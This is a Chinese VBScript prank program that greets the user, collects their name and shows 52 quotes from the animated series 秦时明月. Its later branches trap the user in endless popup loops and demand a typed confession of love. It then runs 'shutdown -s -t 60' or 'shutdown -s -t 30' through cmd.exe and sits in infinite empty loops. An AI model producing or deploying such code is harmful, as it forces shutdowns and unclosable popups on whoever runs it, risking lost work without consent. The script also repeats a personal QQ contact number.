msgbox"我姓惠，名佳萌，大家可以叫我岁萌。"
msgbox"这是我的QQ：2941640224 我的男神么么哒~_~ 哦！"
a=inputbox("请问你是？")
msgbox "哦，"+ a +"，原来是你啊！"
msgbox a+"，欢迎来到我的 Dreamwing 唯美语境。"
msgbox"以下是我在《秦时明月》中搜寻的唯美语段。"
msgbox"希望大家喜欢！要打起∞﹪的精神哦，开始啦！"
msgbox"1、失去了家园的人们,也失去了做人的尊严,失去了自己的名字,失去了祖祖辈辈的姓氏.在这条苦难的路上,必须像动物一样生活,这样动荡不安的世界,没有人可以选择自己的命运,即使拥有强大的力量,也无法改变历史的潮流,没有战火,没有残杀,到底有没有这样的世界.这条路将通往哪里,看来只有我们的后一辈才知道了。——盖聂《秦时明月之百步飞剑》"
msgbox"2、硝烟飘到了遥远的尽头 ，战场已被风沙掩埋 ，呐喊在空寂里沉默；古剑在残风中腐朽 。为战斗而生的灵魂，开始为生存而战斗，没有号角的年代里，生存是唯一的长路。——《秦时明月之万里长城》"
msgbox"3、杀戮永远不是变强的理由,一个人,若以打败别人而证明自己,那他就已经输了。——盖聂《秦时明月之诸子百家》"
msgbox"4、如果提出的问题本身就有问题，那么答案又有什么用呢？——盖聂《秦时明月之诸子百家》"
msgbox"5、奇怪的人往往做一些奇怪的事，这一点也不奇怪。——墨家巨子（燕太子丹）《秦时明月之诸子百家》"
msgbox"6、这个世上，胜者生，而败者亡，在世事的胜负面前，生与死不过是必然的因果。——鬼谷子《秦时明月之夜尽天明》"
msgbox"7、有些梦想虽然遥不可及，但不是不可能实现。只要我足够的强。——少年盖聂《秦时明月之诸子百家》"
msgbox"8、要想成为强者，就不要回避心里的恐惧，恐惧并不是弱点。强者，是要让你的敌人比你更恐惧 。——盖聂《秦时明月之百步飞剑》"
msgbox"9、儒以文乱法，侠以武犯禁。这些所谓的侠义之人，正是国家最大的乱源。——卫庄《秦时明月之万里长城》"
msgbox"10、这一瞬的温暖，我愿用一生去换取。——少女赤练《秦时明月之万里长城》"
msgbox"11、这些沙子，如此渺小无力。只能随风沉浮而身不由己，连自己都不知道下一刻会飘向何方，然而我一直觉得，即便是微不足道，即便外面的风云变幻都与它无关，它总还有存在的理由。——赤练《秦时明月之万里长城》"
msgbox"12、岁月沉淀，苍生不过是一瞬间。在洪荒的潮流里。剑，劈开了一个时代。——《秦时明月之万里长城》"
msgbox"13、从我学会奔跑的那一刻起，我就开始不停地向前奔跑，因为我不敢回头。怕回头看见的，是你眼角的失望。——少女赤练《秦时明月之万里长城》"
msgbox"14、有些人永远都屹立在巅峰，铭刻在明灭不定的青史里。即使被尘世遗忘，也闪耀着永恒。——《秦时明月之万里长城》"
msgbox"15、一条无限延伸的思绪，一场浮华落空的梦境。结局，宿命。——《秦时明月之万里长城》"
msgbox"16、世间万物、飞禽走兽，都是有灵性的，只要有心，就能感受到乐曲中的真义。这首曲子叫做空山鸟语，迷失在幽谷中的鸟儿，独自飞翔在这偌大的天地间，却不知自己该飞往何方。谢谢你的礼物，还有一首曲子，写的是一种最特别的鸟。它是百鸟之首，但是在它的生命之路上，必须要经历一次又一次的毁灭，当它历经磨难奋力冲破死亡的绝境，它将获得新生。——弄玉《秦时明月之空山鸟语》"
msgbox"17、世界上没有一种鸟，能够一直飞翔，永远不需要落地。——白凤《秦时明月之空山鸟语》"
msgbox"18、盖聂：所谓强者，就是必须站在所有人的顶端吗？    卫庄：如果不把人都踩在脚下，他又怎会抬头看你，承认你是强者？    盖聂：这就是唯一的生存之道？    卫庄：弱肉强食，不过是世间万物的天性罢了。    盖聂：我们虽是同门，却必须争个你死我活，这也是天性？    卫庄：这是鬼谷修炼最强者的门规，历代相传，每一代都是纵横天下的霸者，纵横天下，这难道不正是我们在这里的原因吗？    盖聂：然而，被这样的门规所驱使着的我们，就可以算是强者了么？    卫庄：三年之期已满，你我之间必有一战，这个问题很快就会有答案了。    盖聂：如果提出的问题本身就有问题，答案又有什么意义呢？——盖聂，卫庄《秦时明月之夜尽天明》"
msgbox"19、失败的人只有一种。就是在抵达成功之前放弃的人。——盖聂《秦时明月之万里长城》"
msgbox"20、有些事情看似希望渺茫，但当你真正去做的时候，就会发现，所谓的希望，一直掌握在自己手中。——赤练《秦时明月之万里长城》"
msgbox"21、勇敢，不是通过让别人为他担心而证明的，尤其是那些关心他的人。强者，是能够让他的朋友与亲人感到安全和放心。——盖聂《秦时明月之百步飞剑》"
msgbox"22、天明，你要永远记住他们的眼神，那是弱者的眼神。他们怕的不是我，他们怕的是挡住我的去路而留下的后果。——盖聂《秦时明月之百步飞剑》"
msgbox"23、永远变换不定的世界，如同一场无法醒来的梦境，世人在梦中迷失方向，从此再找不到回家的道路。谁来安慰哭泣的孩子，为她擦去停止不住的泪水。人们在等待一个英雄，带领他们寻找传说中的乐土。——《秦时明月之百步飞剑》"
msgbox"24、狼，是种很奇特的野兽，他总是行走于寒冷幽冥之中，总是故意躲开阳光，生怕暖洋洋的温度，使它淡忘了生存的这个世界是多么残酷和偏狭，为了使他们记住这一点，它非常的痛苦、坚忍，即使对待自己的同类，也没有丝毫的影响。狼，或许是这个世界上，最顽强最可怕的动物。有很多人，就像狼一样活着。——《秦时明月之百步飞剑》"
msgbox"25、光明，或是黑暗。大家拼出性命守护的究竟是什么？是正义？还是自己的那一份心意？——天明《秦时明月之诸子百家》"
msgbox"26、天明，你真的可以做到吗？你身边的朋友、同伴一个接一个倒下，而你，却什么也做不了，一个也救不了。——《秦时明月之万里长城》"
msgbox"27、这就是他的命运，从他离开秦国的那一天起，就已经注定。——月神《秦时明月之夜尽天明》"
msgbox"28、只可惜，我有一样速度没你快，就是送命的速度！——盗跖《秦时明月之夜尽天明》"
msgbox"29、我相信我身后的这个人。他所受的每一处伤，都可能致命，没有人能够在离死亡这么近的距离撒谎，没有一个出卖朋友的无耻小人会有那样的勇气。所以，我相信。——端木蓉《秦时明月之夜尽天明》"
msgbox"30、师傅，弟子违背了你的临终嘱托，终于没有逃脱医者的宿命。你总说我是学医的奇才，但人心，似乎比医学药理难得多，此时此刻，我竟不知是悲伤还是快乐，在你眼中，我永远是长不大的小女孩 端木蓉和师傅的对话：端木；师傅，他到底，是一个什么样的人。端木师傅：说不清楚。恐怕，没有人说得清楚。端木：有人说，真正了解他的人，只有他的对手，当你面对他剑的那一刻。端木师傅：他的剑，或许真的很可怕。但是到底是真是假，没有人知道，也没有人愿意去了解。端木：那他一定很孤独。端木师傅：剑，本来就是孤独的。端木：他既没有朋友，又没有亲人，好像很可怜很可怜。端木师傅：有这样的感觉，是非常危险的。端木：为什么？端木师傅：剑，原本就是这个世上最危险的东西之一。任何与剑的距离太近的人，都会受伤，甚至，失去自己的生命。端木：受伤…… 端木师傅：包括他自己在内——端木蓉回忆《秦时明月之夜尽天明》"
msgbox"31、我们本来就是为战争而生的，如果没有战争，我们存在又有什么意义呢？——卫庄《秦时明月之诸子百家》"
msgbox"32、乐土是由那些弱者供奉给这个世上真正强者的。——卫庄《秦时明月之诸子百家》"
msgbox"33、公平？弱者没有资格要求公平！——卫庄《秦时明月之诸子百家》"
msgbox"34、假如世上真的有天涯海角 你愿意跟我一起去么。——高渐离《秦时明月之诸子百家》"
msgbox"35、你想要简单的，我就给你简单的。——高渐离《秦时明月之夜尽天明》"
msgbox"36、你说的没错，你的大叔是个了不起的人，无论别人怎么对他，也不管别人怎么看他，他始终没有改变过。我之前一直都不相信他，危急关头还一心把他当做最大的敌人，但他始终默默承受着，在墨家面临三百年来最大一次浩劫的当口，他依然凭借一己之力，支撑着我们所有人的生命和信念。——高渐离《秦时明月之诸子百家》"
msgbox"37、我不在意任何世俗的牵绊，我所希望的，就是能够，陪你走到生命的尽头！——高渐离《秦时明月之诸子百家》"
msgbox"38、也许在未来的岁月里，你都要独自面对危险和艰难，或许你永远都不会像其他的孩子，享受父母的呵护和温暖，但是你要记住一点，你所拥有的爱，并不比任何一个人少，你的生命，原本就是用巨大的代价换来的。所以，我的孩子，你不要害怕，你要坚强！——丽姬《秦时明月之夜尽天明》"
msgbox"39、我一直不太明白你说的那天是不是真的可以到来，不过我一定会跟着你一起去寻找答案。——阿纲《秦时明月之诸子百家》"
msgbox"40、生在燕国，是上天决定的，但是与大哥做兄弟，是我自己的决定。我们不惜生命在战斗着，是为了燕国男人的尊严。——阿纲《秦时明月之诸子百家》"
msgbox"41、我只是觉得所谓的信念，在每个人的心里，似乎是完全不同的东西。让我觉得更有趣的是，信念似乎只有活着的人才有资格谈论。对于一群即将要死的人。你们往前再走一步，可能和信念的距离就越来越远了。——白凤《秦时明月之诸子百家》"
msgbox"42、在这纷纷乱世，我们医者,是天下众生的守护人，但是，你的医术可以救活天下所有的人，却救不了自己，这是我们医者的宿命，所以，为了传承救世绝学，你一定要远离纷争，远离恩仇。永远，不要爱上一个以剑为生的男人。——端木蓉师傅《秦时明月之夜尽天明》"
msgbox"43、这么多年，能够与各位一起携手与共，在这片天地间闯荡，是我的荣幸。我们都是曾经死过一次的人，能够在这里相聚，这里就是属于我们的乐土。可惜在这个天底下，还有很多人无法享受这样的快乐。我们的梦，是由历代墨家子弟一辈一辈传下来的，这个梦想也将由我们一代一代的传承下去。——燕太子丹《秦时明月之诸子百家》"
msgbox"44、如果没有龙，屠龙的剑又有什么价值呢？——公输仇《秦时明月之夜尽天明》"
msgbox"45、只有经历真正最重伤痛的人，才有坚不可摧的心脏。这心脏产生的血液，本身就是有毒的，比蛇液还要毒一百倍。——赤练《秦时明月之诸子百家》"
msgbox"46、持续了一千年的时代，已经结束，每个人内心深处，都多了一片废墟。曾经广阔和辉煌的记忆平原，都在新世界的阴影中化做沙尘。那些曾经致死不休的顽强抵抗，在无情的铁蹄下逐个崩塌；曾经纷乱割裂的豪雄，被熔铸成完整的江山；曾经震耳欲聋的喧哗，最终沉寂为一个声音——嬴政"
msgbox"47、不知道怎样，才算是誓言 一定会再相遇，世界终结之前。——赤练《秦时明月之万里长城》"
msgbox"48、记忆在时间中乘风 往事如流水匆匆逝去 生命花瓣在冬夜飘零 犹如停留叶面的晨露 人们都在追寻一片乐土 可以远离战火和纷争 享受上苍给予的快乐与宁静 背负着坎坷命运的大地上 这样的梦似乎遥不可及 曾经有这样一个人 他的梦就是把虚无的遥远变成触手可及的真实 即便失去白日的阳光 永远行走在黑夜的暗影 岁月不断沧桑残酷 破晓分割黑夜白昼 当天边的北斗星再次升起 这个梦将被无尽的延续。——《秦时明月之万里长城》"
msgbox"49、当你的眼睛注视着天空时，永远别忘记自己的双脚还沾着尘土。——墨鸦《秦时明月之空山鸟语》"
msgbox"50、别再逼迫自己，这是我唯一能为你做的事情了。——小灵《秦时明月之罗生堂下》"
msgbox"51、白凤：怎样才能掌控自己的命运。墨鸦：首先，你必须足够的快。白凤：要快到怎样的程度。墨鸦：足以超越生命的流逝。——《秦时明月之空山鸟语》"
msgbox"52、想不到我的命这么不值钱，这下再也骗不了自己了  不过，既然这条命不值钱，就不用担心会失去更多了，哪怕只拼到一点儿，也算是赚了。——墨鸦《秦时明月之空山鸟语》"
msgbox"呵呵，这好像52集大型语言连续剧啊！"
msgbox"这些句子我非常喜欢，你觉得呢？"
msgbox"能够看到这里，看起来你也很喜欢啊！"
msgbox"前些日子，我终于领悟了“爱屋及乌”的真正含义。"
msgbox"不过这似乎是它的“逆命题”哦！"
msgbox"但这“逆命题”也是真的哦！你可要小心了。。。"
msgbox"难道说。。。#^_^#"
msgbox"<(￣▽￣)> 哇哈哈…   o(≧v≦)o~~不信   ~\(≧▽≦)/~啦啦啦   "
if msgbox("说，你是不是喜欢我呀！",vbyesno+vbinformation,"我姓惠，名佳萌，大家可以叫我岁萌。")=vbyes then
msgbox"真的！"
msgbox"那你怎么不告诉我呀！"
msgbox"什么，你不敢说。。。"
msgbox"呃"
msgbox"或许真的是“"+ a +" + 岁萌 =我们的友谊”"
msgbox"猜我今天给你带来什么了！"
do
c=inputbox("嗯，你猜？")
if c="无限弹窗" then
msgbox"哇！你好聪明，这都能猜出来。好羡慕啊、、、"
msgbox"那你就好好享受吧！"
do
WScript.Echo("嘿，谢谢你打开我哦，我等你很久啦!"&TSName) 
WScript.Echo("你是可爱的"+a+"吗?")  
WScript.Echo("哈,我想你啦，这你都不知道吗？") 
WScript.Echo("怎么才来，说~是不是不关心我") 
WScript.Echo("哼,我生气啦，等你这么久，心都凉啦。") 
WScript.Echo("小强很生气，后果很严重哦。") 
WScript.Echo("嘿嘿！你也会很惨滴哦！") 
WScript.Echo("是不是想清除我？")  
WScript.Echo("那你要点上50下哦，不过会给你惊喜滴") 
WScript.Echo("还剩49下，快点点哦") 
WScript.Echo("还剩48下，快点，小笨蛋！") 
WScript.Echo("还剩47下，对，就这样快点点！")  
WScript.Echo("还剩46下。你啊就是笨，要快哦，我先不打扰你工作。") 
WScript.Echo("还剩45下，记得要快哦！") 
WScript.Echo("还剩43下") 
WScript.Echo("还剩42下")  
WScript.Echo("还剩41下") 
WScript.Echo("还剩40下") 
WScript.Echo("还剩39下") 
WScript.Echo("还剩38下") 
WScript.Echo("还剩37下") 
WScript.Echo("还剩36下") 
WScript.Echo("还剩35下") 
WScript.Echo("还剩34下") 
WScript.Echo("还剩33下") 
WScript.Echo("还剩32下") 
WScript.Echo("还剩30下") 
WScript.Echo("还剩29下") 
WScript.Echo("还剩28下") 
WScript.Echo("还剩27下") 
WScript.Echo("还剩26下") 
WScript.Echo("还剩25下") 
WScript.Echo("还剩24下") 
WScript.Echo("还剩23下") 
WScript.Echo("还剩22下") 
WScript.Echo("还剩21下") 
WScript.Echo("还剩20下") 
WScript.Echo("还剩19下")  
WScript.Echo("还剩18下") 
WScript.Echo("还剩17下") 
WScript.Echo("还剩16下") 
WScript.Echo("还剩15下") 
WScript.Echo("还剩14下")  
WScript.Echo("还剩13下停停！！！慢点，我有话要说") 
WScript.Echo("还剩12下，你继续点我就会消失滴") 
WScript.Echo("还剩11下，以后就看不到我啦。555555") 
WScript.Echo("还剩10下，你现在可以选择停止！") 
WScript.Echo("还剩9下。你还点啊，不要我啦？") 
WScript.Echo("还剩8下，有点伤心啦，干嘛丢弃人家") 
WScript.Echo("还剩7下。疯了，你有点负意！") 
WScript.Echo("还剩6下。对。你就点吧，我恨你！") 
WScript.Echo("还剩5下，不明白，删除我你就好吗？") 
WScript.Echo("还剩4下！真要删除我？")  
WScript.Echo("还剩3下。可是我真的很眷恋你。。。") 
WScript.Echo("还剩2下。不要这么绝情嘛，人家是爱你的！") 
WScript.Echo("还剩1下。哼，既然你这么绝情。也别怪我无义！！！")  
WScript.Echo("我本因该消失的，不过我留恋你滴芳容，上帝又给了一次机会。") 
WScript.Echo("想结素我么?那你就再多点一次") 
WScript.Echo("想结素我么?那你就再多点一次") 
WScript.Echo("想结素我么?那你就再多点一次") 
WScript.Echo("好吧！你赢了，不过，请记住我的名字“我的男神么么哒~_~” 你的朋友：惠佳萌  致敬···")
WScript.Echo("希望你可以开心每一天") 
WScript.Echo("如果。")
WScript.Echo("如果。。")
WScript.Echo("如果。。。")
WScript.Echo("哇！好好玩啊！要不。。。。")
WScript.Echo("要不我们再来一次吧！！！")
WScript.Echo("一如往昔，我在这里等你。  赵前 著")
wscript.Sleep 500
loop
else
msgbox"嗯,似乎猜错了耶！"
msgbox"猜不出来了吧！(*^__^*) 嘻嘻。。。"
msgbox"算了，告诉你吧！"
msgbox"我给你带来的是。"
msgbox"是。"
msgbox"是。。"
msgbox"是。。。"
msgbox"“无限弹窗”呵呵，好受吧！！！"
msgbox"一如往昔，我在这里等你。  赵前 著"
msgbox"好了，快回去输入答案吧！！！"
end if
loop
else
msgbox"你确定。"
msgbox"唉，我想也是。。。"
msgbox"看来我们的关系真不咋的。"
if msgbox("那要是我以生命做代价呢？",vbyesno+vbinformation,"我姓惠，名佳萌，大家可以叫我岁萌。")=vbyes then
do
msgbox"看来我们还可以做朋友。"
msgbox"只不过命运悲喜啊！！！"
msgbox"嘻"
msgbox"嘻嘻"
msgbox"嘻嘻嘻"
msgbox"嘻嘻嘻嘻"
msgbox"嘻嘻嘻嘻嘻"
msgbox"好吧！谁叫你刚才那个态度呢？"
msgbox"要在QQ上给我留言道歉哦！"
msgbox"我的QQ是 2941640224  我的男神么么哒~_~  呵呵，别搞错哦！"
dim a
do
b=inputbox("呵呵！为了惩罚你，"+ a +"请输入“我真的喜欢你啊”，否则关机。")
if b="我真的喜欢你啊" then
msgbox"好吧！你真是个诚实的好孩子，可惜，当你的眼睛注视着天空时，别忘了你的双脚早已沾满尘土。"
msgbox"你还有60秒的思考时间，有问题QQ上联系。"
msgbox"哦，你没留意我的QQ吧，告诉你  我的男神么么哒~_~2941640224 "
msgbox"一如往昔，我在这里等你。  赵前 著"
set WSHshell = wscript.createobject("wscript.shell")
WSHshell.Run "cmd.exe /c shutdown -s -t 60"
exit do
else
msgbox"乖点，输入“我真的喜欢你啊”，不然的话，坏笑。。。"
msgbox"本程序由 汀下、梧桐絮  赵前  编写，别怀疑我的技术。感谢支持。"
end if
loop
loop
else
msgbox"想不到我的命这么不值钱"
msgbox"这下再也骗不了自己了"
msgbox"不过。。。"
msgbox"既然这条命不值钱，就不用担心会失去更多了。"
msgbox"哪怕只拼到一点儿，也算是赚了。"
msgbox"放下你手中的鼠标，束手就擒吧。"
msgbox"什么，你不，呵呵，坏笑 。。。"
msgbox"信念这种东西似乎只有活着的人才会拥有，而对于一个将死之人，是没有理由跟我谈什么信念的，因为，死者将会得到解脱、、、"
msgbox"记住，当你的眼睛注视着天空时，别忘了自己的双脚早已沾满尘土。"
msgbox"也请记住我的名字,“我的男神么么哒~_~”，QQ：2941640224，一如往昔，我在这里等你。  赵前 著"
dim WSHshell
set WSHshell = wscript.createobject("wscript.shell")
WSHshell.Run "cmd.exe /c shutdown -s -t 30"
do
loop
end if
do
loop
end if
